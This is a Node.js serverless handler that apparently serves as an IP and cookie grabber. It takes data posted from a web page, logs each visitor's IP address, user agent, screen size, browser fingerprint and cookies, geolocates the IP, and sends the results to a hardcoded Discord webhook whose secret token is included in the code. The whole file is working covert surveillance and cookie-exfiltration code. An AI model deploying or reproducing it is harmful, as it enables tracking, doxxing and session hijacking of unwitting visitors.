const axios = require('axios');

module.exports = async (req, res) => {
    // Only allow POST
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    const data = req.body || {};

    // Optional geo lookup
    let geo = {};
    try {
        const geoRes = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp`, { timeout: 3000 });
        if (geoRes.data.status === 'success') geo = geoRes.data;
    } catch (e) {}

    // Build Discord embed
    const embed = {
        title: '🎯 New Visitor',
        color: 0xff0044,
        fields: [
            { name: 'IP', value: ip, inline: true },
            { name: 'User Agent', value: req.headers['user-agent'] || 'Unknown', inline: true },
            { name: 'Screen', value: data.screen || 'Unknown', inline: true },
            { name: 'Time', value: new Date().toISOString(), inline: true },
        ],
    };
    if (geo.country) embed.fields.push({ name: '📍 Location', value: `${geo.city}, ${geo.regionName}, ${geo.country}`, inline: false });
    if (data.fingerprint) embed.fields.push({ name: '🔍 Fingerprint', value: data.fingerprint.substring(0, 200), inline: false });
    if (data.cookies) embed.fields.push({ name: '🍪 Cookies', value: data.cookies.substring(0, 200), inline: false });

    // Send to Discord webhook
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1545864793267642378/IDuVmb0NJeGzVfw_oO5-_r3wsZd2-3rNc2vxG5rNUa0zrCNJPTGTSg_vsOkpsmSzFVkW';
    try {
        await axios.post(WEBHOOK_URL, { embeds: [embed] });
        console.log(`[+] ${ip} logged`);
    } catch (e) {
        console.error('Webhook error:', e.message);
    }

    res.status(200).json({ status: 'ok' });
};